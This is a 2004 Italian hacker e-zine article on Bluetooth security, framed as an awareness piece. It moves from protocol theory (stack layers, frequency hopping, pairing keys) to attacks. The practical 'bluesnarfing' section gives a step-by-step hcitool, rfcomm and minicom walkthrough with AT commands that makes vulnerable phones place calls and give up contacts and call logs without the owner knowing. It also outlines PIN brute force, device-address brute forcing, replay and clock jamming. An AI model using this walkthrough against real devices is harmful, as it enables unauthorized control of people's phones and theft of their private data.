@@ -1,0 +1,634 @@
+================================================================================
+---------------------[ BFi13-dev - file 18 - 20/08/2004 ]-----------------------
+================================================================================
+
+
+-[ DiSCLAiMER ]-----------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini esclusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+--------------------------------------------------------------------------------
+
+
+-[ THREADS ]--------------------------------------------------------------------
+---[ BLUET00TH, TUTTA LA VERiTA`, NiENT'ALTR0 CHE LA VERiTA` ]------------------
+-----[ boos <boos@core-dumped.info> &&                         ]-----------
+-----[ Dante Alighieri <dante@alighieri.org> http://www.bluejack.it ]-----------
+
+
+----- Bluetooth, tutta la verita`, nient`altro che la verita`. -----
+
+Dante Alighieri & boos.
+
+Partenza: Milano MPX
+Destinazione: Orlando (FL)
+Sul volo in partenza da: Paris CDG.
+Sul volo in arrivo a: Atlanta
+Velocita`: 848 km/h
+Altezza: 10668m
+Temperatura: -46 Gradi Centigradi
+Km percorsi: 2413
+Km restanti: 4639
+
+Questo articolo, sara` diviso in due parti, una teorica ed una essenzialmente
+pratica.
+La teoria, PURTROPPO, ci serve per riuscire a comprendere fino in fondo cio` che
+PRATICAMENTE faremo piu` tardi. Tuttavia, cerchero` di non dilungarmi troppo
+sulla parte teorica, anche perche` a fine articolo vi passero` una serie di link
+da cui potrete studiare per bene ed approfonditamente tutta la teoria. La parte
+pratica invece, e` semplicemente frutto di prove e smanettamenti, per cui sara`
+difficile che troviate documentazione del genere in giro.
+Scopo principale di questo documento e` quello di far riflettere tutti voi su
+quanto sia stupido e banale riuscire a comandare a distanza un dispositivo
+Bluetooth (nel nostro caso un cellulare) permettendovi di impartire un notevole
+numero di comandi, senza che il legittimo proprietario se ne accorga
+minimamente.
+Non lo faccio ne` per cattiveria, ne` per arroganza, ma spero semplicemente che
+qualcosa cambi, che qualcuno si muova.
+
+Il perche` sia possibile dare numerosi comandi e prendere "possesso" del
+dispositivo remoto e` probabilmente il marketing o una risk management activity
+con un bilancio errato.
+Sulla sicurezza ha prevalso il denaro, perche` e` ovvio che un dispositivo che
+non dia alcun problema di accoppiamento o configurazione (semplicemente perche`
+la password non e` richiesta) sia il piu` venduto!
+
+Inutile perdersi in chiacchiere, incominciamo subito.
+
+Bluetooth, i protocolli. 
+
+Nel Bluetooth esistono due tipi di protocolli: di middleware e di trasporto.
+I protocolli di middleware non fanno altro che appoggiarsi a quelli di trasporto
+per fornire supporto alle applicazioni che li sfruttano.
+I protocolli di trasporto invece sono stati disegnati appositamente per il
+bluetooth.
+Ecco uno schema dello stack dei vari protocolli, di middleware e di trasporto:
+
+ _______________________________________________________________
+|                                                               |
+|                          APPLICAZIONI                         |
+|_______________________________________________________________|
+
+ _______________________________________________________________
+|           |           |                         ______________|
+|    TCS    |    SDP    |    ALTRI PROTOCOLLI    |    RFCOMM    | *Middleware*
+|___________|___________|________________________|______________|
+ _______________________________________________________________
+|                                                               |
+|                             L2CAP                             | *Trasporto*
+|_______________________________________________________________|
+|                                                               |
+|                                                               |
+|                             *HCI*                             |
+|                                                               |
+|               ________________________________                |
+|              |                                |               |
+|              |      LINK MANAGER PROTOCOL     |               |
+|              |________________________________|               |
+|                                                               |
+|_______________________________________________________________|
+|                                                               |
+|                            BASEBAND                           |
+|_______________________________________________________________|
+|                                                               |
+|                             RADIO                             |
+|_______________________________________________________________|
+
+Incominciamo quindi a spiegare per benino cosa sono e a cosa servono questi
+protocolli, per facilitare la comprensione, partiremo dal basso.
+
+Radio.
+
+Il protocollo Radio, come potrete facilmente notare dalla figura, e` quello di
+piu` basso livello, quello fisico, per intenderci, e definisce quelle che sono
+le caratteristiche di trasmissione "radio" appunto di qualsiasi dispositivo
+bluetooth.
+Le onde radio operano sulla banda ISM (Industrial Scientific Medicine) dei
+2.4Ghz e usa la tecnica del frequency hopping per riuscire ad annullare le
+interferenze tra piu` trasmissioni che inizino a trasmettere contemporaneamente.
+Il frequency hopping e`, come dice lo stesso nome, un salto di frequenza
+periodico e pseudocasuale che avviene in uno dei 79 canali disponibili.
+Questo vuol dire che le possibili frequenze andranno da 2.402+0 a 2.402+78
+(Mhz).
+La sequenza di salti di una piconet (una rete bluetooth) e` unica ed e` ricavata
+attraverso l`indirizzo del dispositivo master della rete (il BD_ADDR) ed altre
+variabili.
+
+I dispositivi bluetooth possono essere divisi in 3 categorie a seconda della
+potenza.
+
+Categoria		Potenza
+ _______________________________________
+|		|			|
+|	1	|	100mW (20dBm)	|
+|_______________|_______________________|
+|		|			|
+|	2	|	2.5mW (4dBm)	|
+|_______________|_______________________|
+|		|			|
+|	3	|	  1mW (0dBm)	|
+|_______________|_______________________|
+
+Ovviamente, una maggiore potenza significa un maggior consumo di energia, per
+cui su dispositivi come per esempio i cellulari, la potenza e` ridotta ad un
+campo di circa 10 metri.
+
+Baseband.
+
+Il protocollo baseband e` alla base della definizione delle procedure che
+permettono la comunicazione attraverso bluetooth tra dispositivi.
+In particolare il protocollo e` responsabile della sincronizzazione, del
+controllo di flusso, della correzione degli errori, della sicurezza delle
+trasmissioni, del salto di frequenza.
+
+Link Manager Protocol.
+
+Il Link Manager Protocol (LMP) e` responsabile delle comunicazioni attraverso i
+componenti di una rete bluetooth. Tra le operazioni piu` importanti che deve
+svolgere c`e` il setting delle proprieta` dei collegamenti esistenti tra
+dispositivi e la loro autenticazione.
+Tra le altre funzioni dell`LMP c`e` anche la verifica periodica della
+raggiungibilita` dell`altro dispositivo e l`apprendimento delle funzionalita`
+offerte dall`LMP all`altro capo.
+
+Dispositivo 1                           Dispositivo 2
+ _______________                         _______________
+|               |         LMP           |               |
+| Link Manager  | <------------------->	| Link Manager  |
+|_______________|                       |_______________|
+|               |                       |               |
+| Link Control  |                       | Link Control  |
+|_______________|                       |_______________|
+|               |                       |               |
+| Radio         |                       | Radio         |
+|_______________|                       |_______________|
+
+L`autenticazione dei due dispositivi avviene quindi con un meccanismo di
+challenge response che si basa sull`LMP.
+
+HCI.
+
+HCI sta per Host Controller Interface, l`HCI e` semplicemente un layer sfruttato
+delle device bluetooth per accedere agli strati piu` bassi. Proprio grazie a
+questo layer un dispositivo Bluetooth puo` eseguire delle richieste di
+autenticazione o ancora di inquiry. Vedremo infatti piu` avanti l`utilizzo del
+tool hcitool.
+
+L2CAP.
+
+Il Logical Link Control and Adaption Protocol si basa sul protocollo Baseband
+per riuscire a capire a che protocollo di piu` alto livello destinare i
+pacchetti da lui gestiti.
+L`L2CAP in pratica e` il layer su cui per esempio l`RFCOMM o l`SDP si
+appoggiano, un "tunnel" tra protocolli di strato piu` basso, e protocolli di
+strato piu` alto.
+Durante il passaggio attraverso questo "tunnel" i pacchetti subiscono varie
+manipolazioni da parte dello strato in questione, tra cui per esempio il
+riassemblamento e la frammentazione. Per cui un pacchetto piu` grande di 341
+bytes non potra` essere passato agli strati sottostanti e viceversa.
+
+                     ___ RFCOMM
+                    |
+                    |
+BASEBAND ---> L2CAP +---- SDP
+                    |\
+                    | \___ Audio
+                    |
+                    |______ TCS
+
+RFCOMM.
+
+L`RFCOMM e` uno dei protocolli che ci saranno piu` "amici" e uno di quelli che
+sfrutteremo.
+Il protocollo rfcomm non fa altro che emulare i sei fili di un normale cavetto
+RS-232 usati per interconnettere cellulari privi di bluetooth a personal
+computer o terminali per la loro programmazione.
+Questo protocollo permette alle applicazioni scritte per funzionare su normali
+cavi RS-232 di funzionare anche su bluetooth.
+
+SDP.
+
+Il Service Discovery Protocol. Progettato con dovute ottimizzazioni, per
+lavorare in maniera piu` performante su dispositivi a limitata capacita`, l'SDP
+permette ad un dispositivo di venire a conoscenza dei servizi offerti dal
+dispositivo con cui vuole instaurare la connessione e delle modalita` di
+connessione ad essi.
+
+TCS.
+
+Il Telephony Control Signaling e` il protocollo che permette di usare i normali
+comandi AT.
+Ma dato che i comandi AT sono stati sviluppati per funzionare su semplici cavi
+seriali, questi non potrebbero funzionare se non grazie all`RFCOMM.
+
+Altri protocolli.
+
+Altri protocolli sono stati sviluppati per riuscire a supplire alle mancanze
+dei primi: alcuni, come il PPP si appoggiano proprio all`RFCOMM. Tra gli altri
+troviamo anche l`IRMC InfraRed Mobile Communication (per usare l`interfaccia
+IRDA, l`infrarossi, tanto per intenderci) o ancora l`OBEX, OBject EXchange
+protocol, usato per lo scambio di file (midi, jpg, avi...) tra dispositivi.
+
+Come avvengono fisicamente le connessioni tra dispositivi Bluetooth?
+
+Torniamo un attimo indietro e rinfreschiamoci la memoria. Abbiamo gia` detto che
+il Bluetooh lavora su onde radio, nella banda dei 2.4Ghz e che usa una tecnica
+chiamata frequency hopping (salto di frequenza) per riuscire ad evitare
+interferenze tra dispositivi che iniziano contemporaneamente una comunicazione.
+
+La sequenza di salti di frequenze in una piconet e` creata basandosi sul clock
+del dispositivo master e dal suo BD_ADDR (indirizzo).
+La trasmissione e` divisa in time-slot e segue uno schema di divisione delle
+trasmissioni di tipo TDD (Time Division Duplex): in pratica dispositivo master e
+slave si alternano nella trasmissione dei dati.
+Esiste anche la possibilita` di inviare pacchetti multislot: durante l`invio di
+un pacchetto multislot il frequency hopping e` stoppato e pertanto se ne deduce
+che la frequenza rimane invariata.
+Quando l`invio del pacchetto multislot sara` terminato, i due dispositivi
+riprenderanno la trasmissione come se avessero continuato a saltare di
+frequenza. Mi spiego meglio, magari con l`aiuto di un grafico.
+
+                Master          Slave
+
+                 _______________________________
+                |  |            |            |  |
+                |  |            |               |
+I time Slot     |  | ------->   | ------->   |  |
+                |  |            |               |
+                |  |            |            |  |
+                |__|            |             __|
+                |               |               |
+                | _ _ _ _ _ _ _ | _ _ _ _ _ _ _ |
+                |  |            |            |  |
+                |               |            |  |
+II Time Slot    |  | <-------   | <-------   |  |
+                |               |            |  |
+                |  |            |            |  |
+                |__             |            |__|
+                | _ _ _ _ _ _ _	| _ _ _ _ _ _  _|
+                |               |               |
+                |               |               |
+                |     etc       |    etc        |
+                |               |               |
+                |               |               |
+                |_______________|_______________|
+
+Il primo dispositivo a inviare dati e` sempre il device master, dopo il primo
+invio del master il dispositivo slave puo` incominciare a trasmettere.
+Vi chiederete quindi come faccia una device slave a mantenere la
+sincronizzazione con il dispositivo master durante il salto di frequenze, la
+risposta e` semplice, conosce il clock del master, e su quello basa tutto il
+processo di sincronizzazione. Proprio su questo si fondera` uno degli attacchi
+che attueremo.
+
+Un cenno a riguardo della correzione degli errori mi sembra doveroso.
+
+Bene, anche il protocollo bluetooth ha implementato un meccanismo per la
+correzione degli errori. Esistono due metodi principali in cui la correzione
+degli errori e` implementata: il primo e` detto FEC CODE 1/3, il secondo 2/3.
+La FEC CODE 1/3 non e` nient`altro che una ritrasmissione per tre volte
+consecutive dello stesso bit, questo tipo di implementazione viene usato
+principalmente per la trasmissione degli header di un pacchetto.
+La FEC CODE 2/3 invece e` un codice di Hamming accorciato, un (15,10) per
+essere precisi, il cui codice generatore e` g(D) = (D + 1)(D^4 + D + 1).
+In parole povere, riesce a encodare uno stream di 10 bit, in 15 bit, sfruttando
+sostanzialmente i bit di parita`. Non mi dilunghero` oltre sull`argomento,
+poiche` non strettamente correlato all`articolo.
+
+Com`e` implementata la sicurezza delle comunicazioni??
+
+________________________________________________________
+Primo Step.                                             |
+                                                        |
+Il dispositivo A si accende e genera una "Unit Key"     |
+Il dispositivo B si accende e genera una "Unit Key"     |
+                                                        |
+Secondo Step.                                           |
+                                                        |
+Viene generata una chiave di inizializzazione.          |
+Prima Autenticazione.                                   |
+Scambio della chiave di link.                           |
+                                                        |
+Terzo Step.                                             |
+                                                        |
+Autenticazione.                                         |
+Generazione della chiave di crittazione.                |
+Comunicazioni crittate.                                 |
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Il meccanismo che i dispositivi bluetooth implementano per dare una PARVENZA di
+sicurezza all`intero meccanismo e` semplice, chiaro, vecchio come il cucco e
+abbastanza funzionale: challenge response.
+Spieghero` quindi brevemente su cosa si basa questo meccanismo.
+I quattro protagonisti principali sono:
+
+- Il BD_ADDR della device di lunghezza 48bit (il suo indirizzo pubblico).
+- Due chiavi segrete: una encryption key da 8 a 128bit ed una chiave di
+  autenticazione di 128 bit.
+- Un numero casuale a 128 bit.
+
+Il BD_ADDR e` un indirizzo standard IEEE che e` univoco per ogni dispositivo,
+mentre le due chiavi insieme al numero casuale sono generate durante il processo
+di comunicazione.
+Le chiavi di encryption sono di solito derivate da quella di autenticazione, che
+poi e` semplicemente la chiave che corrisponde al loro collegamento, e vengono
+quindi chiamate "link" keys; quando pero` il dispositivo master vuole instaurare
+una comunicazione con tutti gli slave appartenenti alla piconet, questa chiave
+e` sostituita con una temporanea e FISSA (!).
+Per quanto riguarda invece il numero casuale a 128bit, questo e` generato da un
+generatore di numeri pseudo casuali che ogni dispositivo bluetooth incorpora.
+
+Cerchiamo di capire quindi cosa succede.
+La comunicazione avviene in 3 fasi principali:
+- nella prima le due unita` che stanno cercando di instaurare la comunicazione
+  creano ognuna una unit key. Questa unit key e` generata una volta solamente da
+  ogni dispositivo, salvo rarissime occasioni, e la sua creazione avviene alla
+  prima accensione;
+- durante la seconda fase invece c`e` il primo handshake tra le due unita`, si
+  genera la prima chiave di inizializzazione e avviene il primo scambio di
+  chiavi.
+- proprio su questo scambio di chiavi si basera` la terza fase, che comprendera`
+  una serie di successivi handshake che termineranno proprio con la creazione
+  delle chiavi di encryption per la comunicazione dei dati.
+
+Tanti, svariati Attacchi.
+
+Vediamo ora invece di riuscire a capire cosa possiamo fare dal punto di vista
+offensivo.
+Cerchiamo quindi di capire cosa si puo` fare dal punto di vista dell`insicurezza
+informatica.
+Vi parlero` quindi di tutti i possibili attacchi effettuabili ad una rete o un
+dispositivo bluetooth.
+
+Sicuramente, una delle cause principali dell`insicurezza di tali dispositivi,
+viene proprio dalla loro capacita` di memoria. La creazione della chiave di
+inizializzazione avviene per esempio tramite 3 variabili date in pasto ad un
+dato algoritmo (E22).
+Queste 3 variabili sono: un numero casuale, il PIN, e la lunghezza del PIN. 
+Tuttavia, dato che il numero casuale viaggia sempre in chiaro sulla
+comunicazione, se come link key viene utilizzata una key di inizializzazione,
+l`unica informazione "mancante" per riuscire a ricostruirla, e` semplicemente
+il PIN, codice (come tutti saprete) di 4 cifre decimali, quindi da 0000 a 9999,
+10000 possibilita`: direi quindi che un attacco di tipo "brute force" sia
+decisamente possibile. Unico impedimento e` un contatore, che ad ogni "sbaglio"
+di PIN, incrementa i secondi da aspettare per un dispositivo affinche` possa
+riprovare un`autenticazione. Certo e` anche pero` che non e` detto che dobbiamo
+attuare un attacco di forza bruta per forza dallo stesso dispositivo, potremmo
+quindi usare un dispositivo con un BD_ADDR diverso e continuare il nostro
+attacco, ciclando i dispositivi impiegati.
+
+Potremmo pensare invece di far finta di essere un`altra device. Tutto sommato
+esistono tre parti in cui un pacchetto di dati puo` essere modificato: il bit di
+acknoledgement, i tre bit dell`indirizzo ed infine gli otto bit per la
+correzione degli errori per gli header.
+
+Un`altra possibilita` e` quella di "copincollare" il flusso di dati, in pratica
+registrarlo e reinviarlo interamente: in questo modo si potrebbero effettuare
+piu` transazioni dallo stesso dispositivo (pensate ad una transazione bancaria
+o di pagamento su internet). E` da ricordare pero` che non solo dovremmo
+riuscire a registrare su 79 canali contemporaneamente, ma dovremmo anche
+ricostruire i pacchetti ricevuti per poi ritrasmetterli ricomponendo lo
+streaming esatto.
+Insomma... decisamente una cosa non semplice da portare a termine.
+
+Ancora, uno degli elementi su cui il dispositivo si basa e` il proprio clock: su
+di esso per esempio avviene il calcolo delle time slot, per permettere ad un
+dispositivo slave di allinearsi con il master. Con un laser a bassa potenza,
+questo clock puo` essere disturbato in modo tale da non permettere il corretto
+funzionamento e quindi la sincronizzazione, causando quindi un DoS.
+
+Toothing, Bluediscovery e Bluesnarfing.
+
+Piccola osservazione prima di iniziare. Un dispositivo bluetooth va un po`
+pensato come un apparecchio con un mini sistema operativo dove i servizi invece
+di partire in ascolto su determinate porte, partono in ascolto su determinati
+canali. Avremo quindi solitamente sul canale 1 (il default) quello della
+telefonia o ancora sul canale 17 o 18 quello della rubrica; esiste ancora quello
+dell`auricolare o quello di scambio di file detto OBEX (OBject EXchange) come
+tanti altri ancora... spero che questo concetto sia chiaro a tutti.
+
+Toothing.
+
+Il toothing, che e` stato tanto acclamato dalla stampa e dalle folle, non e`
+nient`altro che lo scambio di "business card" cioe` bigliettini da visita, tra
+dispositivi. Per evitare cio`, basta dire "no" quando il dispositivo ci
+chiedera` se vogliamo o no ricevere il bigliettino.
+
+Bluediscovery.
+
+Arriviamo alla parte piu` interessante...
+Quando il bluetooth e` attivato su di un dispositivo, solitamente ha tre stati:
+visibile, disabilitato e nascosto.
+Il dispositivo sara` quindi raggiungibile da tutti se visibile, non
+raggiungibile in nessuna maniera se disabilitato e raggiungibile solo dai
+dispositivi accoppiati se nascosto. Ma come faranno i dispositivi accoppiati a
+vedere il dispositivo se e` "nascosto"? Niente di piu` facile, quando
+selezioniamo lo stato come "nascosto" il dispositivo smette di annunciarsi, ma
+non blocca i propri servizi; questo vuol dire che il dispositivo "accoppiato"
+semplicemente ha registrato nella configurazione il BD_ADDR dell`altro
+dispositivo e invece di cercarlo, lo chiama direttamente.
+Ma se noi quindi gia` sappiamo l`indirizzo dell`altro dispositivo e il canale
+su cui connetterci?
+Come potrete ben immaginare, funzionera`.
+Stesso ragionamento quindi per il brute forcing, possiamo incrementare un
+indirizzo provando a connetterci incrementando ogni volta il BD_ADDR di 1 fino
+a quando non troviamo quello giusto.
+Guardiamo infatti un tipico indirizzo bluetooth:
+
+00:0A:D9:03:12:36
+
+Potreste pensare che riuscire a trovare l`indirizzo giusto sia un bel casino, ed
+io sarei anche d'accordo con voi, se non fosse per il fatto che i primi tre
+campi, 00:0A:D9 in questo caso, sono "fissi" per ogni produttore ed ovviamente
+disponibili liberamente su internet, proprio come succede per i MAC address.
+Grazie a questo in realta` la difficolta` diminuisce significativamente e ancor
+piu` se si pensa che un attacco del genere potrebbe essere portato da 7
+dispositivi alla volta: dividendo quindi i range di scansione si arriva ad un
+tempo, piu` che ragionevole, di 1 ora.
+Per evitare tale vulnerabilita` non esiste altra soluzione che disabilitare il
+bluetooth.
+Un tool per fare bruteforcing sugli indirizzi e` stato sviluppato da @stake ed
+il suo nome e` redfang (http://www.atstake.com/research/tools/info_gathering/).
+
+Bluesnarfing.
+
+Qui viene la parte migliore...
+Ora, ricordate il protocollo RFCOMM? Bene, questo protocollo, come gia` detto,
+emula i nove cavetti di un cavo seriale RS-232, tutto cio` per permettere alle
+applicazioni che sono normalmente progettate e sviluppate per usare il cavo
+seriale di lavorare anche tramite bluetooth.
+Il problema e` che su alcuni modelli di nokia (6310i per esempio) e di sony
+ericson (T68, T61...), non e` stato implementato per il servizio di phonebooking
+e di telefonia alcun controllo tramite password, pin, o simili.
+
+Ricompilate il kernel 2.4.X o 2.6.X includendo lo stack bluetooth "blueZ",
+installate le blueutils e gli hcitools e vi faro` vedere come sia realmente
+facilissimo riuscire a prendere con comuni programmi il pieno controllo della
+device remota.
+Useremo principalmente due tool: hcitool e rfcomm.
+
+hcitool ci permettera` di fare alcune richieste alla/e device bluetooth nella
+nostra area.
+Partiamo con uno scan per capire se ci sono o meno dispositivi bluetooth nel
+nostro raggio di azione.
+
+root@sofficino# hcitool scan
+Scanning ...
+	00:0A:D9:03:12:36 sciamaru
+
+root@sofficino#
+
+Bene, abbiamo trovato un dispositivo bluetooth.
+Con le opzioni "info" e "name" riusciremo ad avere maggiori notizie a riguardo.
+Ora useremo invece il tool "rfcomm" che non e` nient`altro che un client per
+l`omonimo protocollo.
+rfcomm (il client) ci permette infatti di bindare un determinato servizio
+bluetooth di un determinato dispositivo su una nostra device.
+Sul canale 1 del nostro dispositivo abbiamo il servizio di telefonia, sul 17
+invece quello di phonebooking.
+
+Effettuiamo una chiamata con il cellulare remoto:)
+
+rfcomm ha 5 comandi: bind, release, show, connect e listen. Quelli che useremo
+saranno i primi 3, iniziamo a darci un`occhiata.
+Il comando "bind" serve appunto per bindare un servizio bluetooth su una nostra
+device, "release" rilascia la device (e quindi il servizio), "show" mostra le
+connessioni attualmente instaurate.
+Mettiamoci al lavoro..
+
+root@sofficino# rfcomm bind 0 00:0A:D9:03:12:36 1
+
+In questo modo abbiamo bindato il canale 1 (telefonia) del dispositivo
+00:0A:D9:03:12:36 sulla nostra device rfcomm0 (/dev/bluetooth/rfcomm/0 o
+/dev/rfcomm/0) infatti...
+
+root@sofficino# rfcomm show
+rfcomm0: 00:0A:D9:03:12:36 channel 1 clean
+
+Ora bastera` lanciare minicom (come spiegato di seguito) o configurare pppd.conf
+in modo tale che invece di usare /dev/ttyXX o simili, usi la nostra nuova
+device, ovvero /dev/bluetooth/rfcomm/0 o /dev/rfcomm/0.
+Dopo di che, lanciate pppd nel solito modo, e il dispositivo remoto effettuera`
+la chiamata VOCE.
+
+Vediamo invece ora come sfogliare per esempio la rubrica, o riuscire a operare
+in modi simili.
+
+root@sofficino# rfcomm bind 1 00:0A:D9:03:12:36 17
+root@sofficino# rfcomm show
+rfcomm1: 00:0A:D9:03:12:36 channel 17 clean
+
+Bene, abbiamo agganciato il canale 17 (come gia` detto, il phonebooking).
+Lanciamo minicom o un qualsiasi altro client simile e settiamo nelle sue
+proprieta` la nostra device (/dev/rfcomm/1 o /dev/bluetooth/rfcomm/1).
+Prima di agire pero`, direi di darci un`occhiata al manuale dei comandi AT che
+l`ETS (European Telecomunication Standard) ci offre, e` un po` vecchiotto ('99)
+ma andra` benissimo (potrete trovarlo su http://www.bluejack.it).
+
+Vediamo cosa ci dice il nostro manuale... CGMI per vedere il produttore... CGMM
+per il modello... hmm ottimo... proviamoli subito...
+
+root@sofficino# minicom 
+
+Welcome to minicom 2.00.0
+
+OPTIONS: History Buffer, F-key Macros, Search History Buffer, I18n
+Compiled on Jul 8 2004, 23:15:52.
+
+Press CTRL-A Z for help on special keys
+
+AT S7=45 S0=0 L1 V1 X4 &c1 E1 Q0
+OK
+AT+CGMI
+ERICSSON      // oh... il produttore... :)
+
+OK
+AT+CGMN
+1130202-BVT68  // oh... il modello :D
+
+Adesso invece seleziono il tipo di rubrica... Piccola parentesi su questo: ho
+trovato questo tipo di rubriche sul manuale, eccovi una lista delle piu`
+comuni... Notare che sul T68 per esempio ho trovato delle rubriche che non ho
+capito ancora a cosa servano...
+
+DC ME Chiamate effettuate -> Dialed Call list
+EN SIM numeri di emergenza -> Emergency Numbers (non accessibile in scrittura)
+FD Fixdialing numbers
+LD Ultime chiamate -> Last dialed calls
+MC Chiamate perse -> Missed Calls
+ME ME telefono phonebook -> phonebook 
+MT ME+SIM
+ON Proprio numero -> Own Number
+RC chiamate ricevute -> Received Calls
+TA TA phonebook
+
+OK
+AT+CPBS="DC"   // ho selezionato le chiamate effettuate
+OK
+AT+CPBR=2
++CPBR: 2, "3476969696", 129, "Dante Alighieri", "2004/07/10, 15:25" 
+
+OK
+AT+CPBS="ME" // seleziono la rubrica
+OK
+AT+CPBF="Dante Alighieri"   // cerco un numero che abbia come nome "Dante
+                               Alighieri"
++CPBF: 22, "3476969696",129,"Dante Alighieri/M"  // ed eccomi qui infatti...
+                                                    nella 22esima posizione
+
+OK
+AT+CPBR=22  // infatti ora cerco per posizione in rubrica...
++CPBR: 22, "3476969696",129,"Dante Alighieri/M"  // ed eccomi qui :D
+
+OK
+
+Beh... altre cose che si possono fare sono per esempio effettuare chiamate
+dati... come? ATDT ! Proprio come in un normale modem.
+
+Un piccolo proof of concept e` stato sviluppato per facilitare tutte le
+operazioni, troverete il codice allegato all`articolo, divertitevi! :)
+
+Conclusioni.
+
+Bene, spero realmente che vi siate divertiti perche` probabilmente adesso
+durante le riflessioni i vostri pensieri si faranno cupi e fitti.
+In Italia abbiamo addirittura una macchina che implementa il bluetooth a bordo
+e davvero NON posso immaginare se connesso o posizionato strategicamente male
+cosa si possa combinare.
+Come avevo predetto in Aprile durante la chiacchierata sullo stesso argomento
+all`hackmeeting e a Parigi circa un paio di mesi prima, e` gia` uscito il primo
+virus che si diffonde non solo via IRC, ICQ, outlook, RPC, ma anche via
+bluetooth.
+Aspettatevi quindi di arrivare al bar dai vostri amici con il vostro palmare ed
+essere infettati da un virus che contagera` la vostra rete casalinga tramite
+sincronizzazione.
+Buon divertimento e ricordatevi di me, quando un giorno non troppo distante vi
+troverete ad installare per la prima volta un firewall sul vostro cellulare.
+
+Referenze:
+
+http://www.bluejack.it (il mio sito dedicato alla sicurezza sul bluetooth)
+http://www.bluetooth.com (il sito principale del bluetooth, con tutte le
+                          descrizioni, gli standard, etc)
+http://www.bluejackhq.com (toothing)
+http://www.betaversion.net/btdsd/ (bluetooth security database)
+http://www.bluestumbler.org
+http://sourceforge.net/projects/bluez/ (BlueZ stack homepage)
+http://www.atstake.com/research/tools/info_gathering/#redfang
+
+
+================================================================================
+------------------------------------[ EOF ]-------------------------------------
+================================================================================
+
